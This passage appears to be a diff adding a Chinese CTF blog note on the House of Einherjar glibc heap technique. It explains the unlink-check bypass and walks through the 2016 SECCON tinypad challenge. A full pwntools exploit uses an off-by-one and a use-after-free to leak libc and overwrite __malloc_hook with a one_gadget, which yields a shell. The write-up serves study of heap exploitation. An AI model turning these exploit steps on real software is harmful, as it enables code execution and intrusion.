@@ -155,6 +155,141 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/28/House-Of-Einherjar/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome!">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/04/28/House-Of-Einherjar/" class="post-title-link" itemprop="url">House Of Einherjar</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-04-28 20:27:03" itemprop="dateCreated datePublished" datetime="2025-04-28T20:27:03+08:00">2025-04-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-29 21:48:51" itemprop="dateModified" datetime="2025-04-29T21:48:51+08:00">2025-04-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>先来看<code>free</code>函数中这一段有关后向合并的代码:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里新的chunk大小和新的chunk指针都由<code>prev_size</code>决定,所以我们可以通过控制<code>prev_size</code>来得到任意地址的chunk</p>
+<p>但是需要注意的是要达到获得任意地址的chunk的效果,需要绕过<code>unlink</code>检测,然后触发<code>free</code>时的后向合并</p>
+<h2 id="unlink的检查"><a href="#unlink的检查" class="headerlink" title="unlink的检查"></a>unlink的检查</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>
+
+<h3 id="size检查"><a href="#size检查" class="headerlink" title="size检查"></a>size检查</h3><p>检查当前堆块的size位置记录的数据和下一个堆块的prev_size数据是否一致</p>
+<p>要绕过这个检测仅需伪造下一个堆块的prev_size位即可</p>
+<h3 id="双向链表检查"><a href="#双向链表检查" class="headerlink" title="双向链表检查"></a>双向链表检查</h3><p>检查<code>FD-&gt;bk</code>和<code>BK-&gt;fd</code>是否均指向自身</p>
+<p><strong>绕过方法1:</strong></p>
+<p>修改chunk的fd和bk指针指向一处能控制得地址<code>ADDR</code>,将<code>ADDR + 0x10</code>位置和<code>ADDR + 0x18</code>位置写入当前chunk的指针</p>
+<p>使得<code>P -&gt; fd = P -&gt; bk = ADDR </code></p>
+<p><code>ADDR + 0x10 = ADDR + 0x18 = P</code></p>
+<p>由此来绕过检测</p>
+<p><strong>绕过方法2:</strong></p>
+<p>直接使<code>P -&gt; fd = P</code></p>
+<p>​			<code>P -&gt; bk = P</code></p>
+<p>在本堆利用方法中也许方法2更为常用</p>
+<h2 id="触发后向合并"><a href="#触发后向合并" class="headerlink" title="触发后向合并"></a>触发后向合并</h2><p>根据这行代码<code>if (!prev_inuse(p)) &#123;</code>,要触发后向合并,当前堆块的P位必须为0,然后再free的时候就可以触发后向合并了</p>
+<h2 id="具体利用例子"><a href="#具体利用例子" class="headerlink" title="具体利用例子"></a>具体利用例子</h2><p>现有chunk A.B,C.</p>
+<p>A和C均处于unsorted bin范围内</p>
+<p>先释放chunkA,然后在A中构造<code>fake_chunk</code></p>
+<p>接着控制chunkC的prev_size位和size域的P位</p>
+<p>释放chunkC,通过控制chunkC的prev_size位和fake_chunk的size位通过unlink的size检查</p>
+<p>就可以达成chunk overlapping了</p>
+<h1 id="例题-2016-Seccon-tinypad"><a href="#例题-2016-Seccon-tinypad" class="headerlink" title="例题:2016 Seccon tinypad"></a>例题:2016 Seccon tinypad</h1><p><a target="_blank" rel="noopener" href="https://github.com/SECCON/SECCON2016_online_CTF/tree/master/Exploit/300_tinypad">题目链接</a></p>
+<p><em>题目给的是2.19的libc,我本机是在2.23的libc下打的</em></p>
+<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>![0](..&#x2F;images&#x2F;house of einherjar&#x2F;0.png)</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>![1](..&#x2F;images&#x2F;house of einherjar&#x2F;1.png)</p>
+<h3 id="off-by-one漏洞"><a href="#off-by-one漏洞" class="headerlink" title="off by one漏洞"></a>off by one漏洞</h3><p>![2](..&#x2F;images&#x2F;house of einherjar&#x2F;2.png)</p>
+<p>在这个函数里有个off by one漏洞,当输入的字节数等于限制的字节数时,限制字节数的下一位将会被覆盖为\x00</p>
+<h3 id="use-after-free漏洞"><a href="#use-after-free漏洞" class="headerlink" title="use after free漏洞"></a>use after free漏洞</h3><p>还可以注意到程序free掉chunk时仅仅将fd那个位置的数据给清零掉了,指针并没有置null,我们可以通过泄露堆块的bk处的数据</p>
+<h2 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h2><p>通过UAF漏洞来泄露libc和heap的基址</p>
+<p>通过off by one达成house of einherjar利用得到overlapping的堆块</p>
+<p>通过chunk overlapping和fastbin attack来修改<code>__malloc_hook</code>为one_gadget来getshell</p>
+<h2 id="撰写exp-py"><a href="#撰写exp-py" class="headerlink" title="撰写exp.py"></a>撰写exp.py</h2><p>先定义几个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>,size)</span><br><span class="line">    sla(<span class="string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>,index)</span><br><span class="line">    sla(<span class="string">&#x27;(CONTEXT)&gt;&gt;&gt; &#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">&#x27;(Y/N)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;q&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;128&#x27;</span>,<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">&#x27;r00t&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#这里得是f0,因为f0申请的是100得chunk,带着flag就是0x101,溢出会把01变为00,如果是别的会抽风，orz</span></span><br><span class="line">add(<span class="string">&#x27;160&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">dele(<span class="string">&#x27;3&#x27;</span>)<span class="comment">#unsorted bin的fd和bk会指向main_arena</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;INDEX: 3&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc: &#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure>
+
+<p>前文提到要泄露堆基地址使构造<code>fake_chunk</code>的时候使其<code>fd</code>和<code>bk</code>位置指向自身,但其实并不需要,原因稍后分析</p>
+<h3 id="free堆块为HOE做准备同时计算地址"><a href="#free堆块为HOE做准备同时计算地址" class="headerlink" title="free堆块为HOE做准备同时计算地址"></a>free堆块为HOE做准备同时计算地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#ru(&#x27;INDEX: 1&#x27;)</span></span><br><span class="line"><span class="comment">#ru(&#x27;CONTENT: &#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#heap_addr = u64(r(3).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#log.info(&#x27;heap: &#x27;,hex(heap_addr))</span></span><br><span class="line"><span class="comment">#这里注不注释其实无所谓,但因为这里heap_addr接收的数据是错误的,还是注释了,原因要是想要了解可以自己去调试一下(我把这篇笔记写了就去~)</span></span><br><span class="line">malloc_hook = libc_addr - <span class="number">0x68</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#info(&#x27;libc: &#x27;,hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]<span class="comment">#2.23libc的one_gadget</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HOE"><a href="#HOE" class="headerlink" title="HOE"></a>HOE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#HOE</span></span><br><span class="line">pause()</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x10</span>)<span class="comment">#index 1 -&gt; chunk3</span></span><br><span class="line">add(<span class="string">&#x27;128&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#p64(0) + p64(0xb0 + 0x40))#伪造fake_chunk</span></span><br><span class="line">    <span class="comment">#+ p64(heap_addr + 0xb0 + 0x40) + p64(heap_addr + 0xb0 + 0x40))</span></span><br><span class="line">    <span class="comment">#index 2 -&gt; chunk1</span></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;104&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0xc0</span> + <span class="number">0x40</span>))<span class="comment">#利用off by one漏洞修改chunk3的P位</span></span><br><span class="line"><span class="comment">#index 3 -&gt; chunk2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;1&#x27;</span>)<span class="comment">#触发堆块后向合并</span></span><br></pre></td></tr></table></figure>
+
+<p>这里<code>dele(‘2’)</code>后chunk1的<code>fd</code>和<code>bk</code>会指向同一处<code>main_arena</code>,同时这块<code>main_arena</code>的<code>fd</code>和<code>bk</code>也都会指向chunk1,所以可以直接通过<code>unlink</code>检查</p>
+<p>这里第九行还有个点需要注意,由于程序的add方法是根据你输入的size的大小来决定输入长度的,但我们都知道malloc申请堆块是向0x10对齐的,且是<em>5舍6入</em>,我们申请104(0x68)大小的内存时其实只给了0x60的大小,剩下0x8可以直接覆盖掉chunk3的prev_size位,再通过off by null控制chunk3的P位![4](..&#x2F;images&#x2F;house of einherjar&#x2F;4.png)</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">b&#x27;e&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">b&#x27;g&#x27;</span> * <span class="number">0x13</span> + p64(ogg[<span class="number">1</span>] + libc_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<p>通过fastbin attack将<code>malloc_hook</code>申请到堆块重叠的部分,再通过别的指针将其改为ogg</p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">io = process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/snolax/桌面/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause()</span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">r   = <span class="keyword">lambda</span> x    : io.recv(x)</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>,size)</span><br><span class="line">    sla(<span class="string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>,index)</span><br><span class="line">    sla(<span class="string">&#x27;(CONTEXT)&gt;&gt;&gt; &#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">&#x27;(Y/N)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    sla(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;128&#x27;</span>,<span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">&#x27;r00t&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#这里得是f0,因为f0申请的是100得chunk,带着flag就是0x101,溢出会把01变为00,如果是别的会抽风，orz</span></span><br><span class="line">add(<span class="string">&#x27;160&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">dele(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#dele(&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;INDEX: 3&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;libc: &#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#ru(&#x27;INDEX: 1&#x27;)</span></span><br><span class="line"><span class="comment">#ru(&#x27;CONTENT: &#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#heap_addr = u64(r(3).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment">#log.info(&#x27;heap: &#x27;,hex(heap_addr))</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr - <span class="number">0x68</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#info(&#x27;libc: &#x27;,hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#dele(&#x27;2&#x27;)</span></span><br><span class="line"><span class="comment">#HOE</span></span><br><span class="line">pause()</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&#x27;128&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#p64(0) + p64(0xb0 + 0x40))</span></span><br><span class="line">    <span class="comment">#+ p64(heap_addr + 0xb0 + 0x40) + p64(heap_addr + 0xb0 + 0x40))</span></span><br><span class="line">    <span class="comment">#写到一半发现好像堆块都不用伪造,直接用chunk1的堆头就行</span></span><br><span class="line">    <span class="comment">#index 2</span></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)<span class="comment">#这里本来是dele(&#x27;1&#x27;)的，但好像1指的不是第一个</span></span><br><span class="line">add(<span class="string">&#x27;104&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0xc0</span> + <span class="number">0x40</span>))</span><br><span class="line"><span class="comment">#add(&#x27;32&#x27;,&#x27;d&#x27;)</span></span><br><span class="line"><span class="comment">#dele(&#x27;1&#x27;) 这里dele(&#x27;1&#x27;)好像会触发前向合并的unlink检测</span></span><br><span class="line">dele(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#好像free验证出错了？就这样吧。。。</span></span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;240&#x27;</span>,<span class="string">b&#x27;e&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"><span class="comment">#dele(&#x27;3&#x27;)</span></span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&#x27;96&#x27;</span>,<span class="string">b&#x27;g&#x27;</span> * <span class="number">0x13</span> + p64(ogg[<span class="number">1</span>] + libc_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<h1 id="一些随笔"><a href="#一些随笔" class="headerlink" title="一些随笔"></a>一些随笔</h1><h2 id="unlink检查的汇编表达"><a href="#unlink检查的汇编表达" class="headerlink" title="unlink检查的汇编表达"></a>unlink检查的汇编表达</h2><p>![3](..&#x2F;images&#x2F;house of einherjar&#x2F;3.png)</p>
+<h2 id="fastbin-attack小要求"><a href="#fastbin-attack小要求" class="headerlink" title="fastbin attack小要求"></a>fastbin attack小要求</h2><p><code>__malloc_hook - 0x23</code>处对应的size位是0x7f,所以fastbin attack的时候申请的chunk也应该是0x70的大小以保证处于同一个fastbinY数组中</p>
+<h2 id="off-by-null漏洞"><a href="#off-by-null漏洞" class="headerlink" title="off by null漏洞"></a>off by null漏洞</h2><p>house of einherjar堆利用中off by null漏洞改变P位时申请的堆块大小要为0x100,0x200等才能起效,因为off by null会改变一整个字节的数据</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/#2016-seccon-tinypad">ctf-wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1828388-1-1.html">吾爱破解题解</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
